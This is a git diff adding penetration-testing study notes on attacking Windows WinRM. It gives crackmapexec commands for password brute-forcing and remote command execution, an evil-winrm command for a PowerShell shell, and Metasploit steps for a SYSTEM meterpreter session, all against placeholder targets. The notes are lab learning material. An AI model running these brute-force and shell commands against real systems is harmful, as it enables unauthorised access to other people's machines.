@@ -16,6 +16,7 @@
 - whatweb
 - davtest
 - cadaver
+- crackmapexec
 
 # Assessment Methodologies: Information Gathering
 
@@ -378,6 +379,20 @@ With an anonymous null session you can access the IPC$ share and interact with s
   
   
   ### Exploiting WinRM
+  - Windows feature, that can be configured and do not run by default. It is a remote Management Protocol that can be used to facilitate remote access to Windows systems over http(s)
+  - It typical uses TCP 5985 and 5986 (https)
+  - Various forms of authntication exists, normally by username and password (or by a hash)
+  - We can utilize a utility called "crackmapexec" to perform a brute-force on WinRM
+  - to obtain a command shell we can use "evil-winrm" (ruby script)
+  
+  - crackmapexec winrm x.x.x.x -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt (you can also specify multiple users in a list (just like with the -p parameter above))
+  - crackmapexec winrm x.x.x.x -u administrator -p tinkerbell  -x "whoami" (Example to run code on a target, x = execute)
+  
+  - evil-rinrm.rb -u administrator -p 'tinkerbell' -i x.x.x.x (Directly establish a PowerShell connection, thats AWESOME!)
+  
+  - metasploit: search for "winrm_script" and use the exploit (set FORCE_VBS to true; Fill out all required fields) -> This is used to get a meterpreter session and obtain system rights! <3
+  
+  
   
   
   
